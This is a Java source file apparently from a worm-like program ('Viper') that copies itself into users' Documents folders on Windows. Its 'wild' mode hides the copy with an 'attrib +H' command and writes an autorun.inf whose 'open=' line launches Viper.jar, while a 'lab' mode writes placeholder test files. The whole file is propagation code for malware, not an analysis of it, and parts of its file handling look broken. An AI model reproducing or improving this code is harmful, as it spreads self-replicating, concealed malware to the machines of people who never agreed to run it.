package propogartion;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;

import communication.Identification;

public class NestEgg {
	static String[] inCodedL= {"testing","testing","testing"};
	static String[] inCodedW= {"[autorun]","open="};
	static int unitCopys=0;
	static int unitNum;
public static void labEgg(Path vPath,int unitNumber){
	File users= new File("C:/Users");
	unitNum=unitNumber;
	File[] targetUsers = users.listFiles();
	for(int x =0; x<targetUsers.length;x++){
		String userCP=users.getAbsolutePath();
		try {
			 userCP=users.getCanonicalPath();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		String usePath= createFilePath(userCP,true);
		createCopy(usePath,vPath,true);
		copyMode(usePath);
	}

}
public static void wildEgg(Path vPath,int unitNumber){
	File users= new File("C:/Users");
	unitNum=unitNumber;
	File[] targetUsers = users.listFiles();
	for(int x =0; x<targetUsers.length;x++){
		String userCP=users.getAbsolutePath();
		try {
			 userCP=users.getCanonicalPath();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		String usePath= createFilePath(userCP, false);
		createCopy(usePath,vPath,false);
		
	}
}
public static String createFilePath(String userPath, boolean lab){
	File doc= new File(userPath+"/Documents");
	if(doc.exists()==false){
		doc=new File(userPath+"/My Documents");
	}
	String docCP=doc.getAbsolutePath();
	try {
		docCP = doc.getCanonicalPath();
	} catch (IOException e1) {
		// TODO Auto-generated catch block
		e1.printStackTrace();
	}
	File uP=new File(docCP+"/vn");
	if(uP.exists()==false){
		try {
			uP.createNewFile();
		} catch (IOException e) {
			System.out.println("interfearence");
			e.printStackTrace();
		}
		
	}
	if(uP.isHidden()==false&& lab==false){
		
		try {
			Runtime.getRuntime().exec("attrib +H "+uP.getCanonicalPath());
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	String uPCP=uP.getAbsolutePath();
	try {
		uPCP = uP.getCanonicalPath();
	} catch (IOException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	}
	return uPCP ;
	
}
public static void createCopy(String filePath,Path vPath,boolean lab){
	File nestLocation=new File(filePath);
	Identification nVID=new Identification();
	try{
		if(lab==true){ 
		File conf= new File(vPath+"/conf.txt");
		 if(conf.exists()==false){
			 conf.createNewFile();
		 }
		
		}
		
		
		
			
		 if(!nestLocation.exists()){
			 nestLocation.createNewFile();
		 
		createAutoRun(lab,filePath);
		
		
		 }
		 }
		 catch(IOException e){
		 System.out.println( "Error: "+ e.toString());
		 }
	nVID.saveInfo(unitNum++, 0, nestLocation);
	try {
		File vF=new File(filePath+"/Viper.java");
		if(vF.exists()==false){
			unitCopys++;
		Files.copy(vPath, nestLocation.toPath(), StandardCopyOption.REPLACE_EXISTING);
		}
	} catch (IOException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	}

}
public static void copyMode(String filePath){
	File nestLocation= new File(filePath);
	File mode=new File(filePath+"/mode.txt");
	if(mode.exists()==false){
		try {
			mode.createNewFile();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
}
public static int getUnitsCreated(){
	return unitCopys;
	
}
public static void createAutoRun(boolean lab, String filePath) throws IOException{
	FileWriter fw;
	if(lab==true){
	fw = new							 FileWriter(filePath+"/test.txt");
	}else{ fw= new FileWriter(filePath+"/autorun.inf");}
		BufferedWriter writing= new BufferedWriter(fw);
	
		if(lab==true){
		
	   for(int x=0;x<inCodedL.length; x++){
		writing.write(inCodedL[x]);
		writing.newLine();
		}
	    writing.close();
		}else if(lab==false){
			for(int x=0;x<inCodedW.length; x++){
				if(x==1){
				writing.write(inCodedW[x]+filePath+"/Viper.jar");
				}else{writing.write(inCodedW[x]);}
				writing.newLine();
				}
			    writing.close();	
		}
}
}
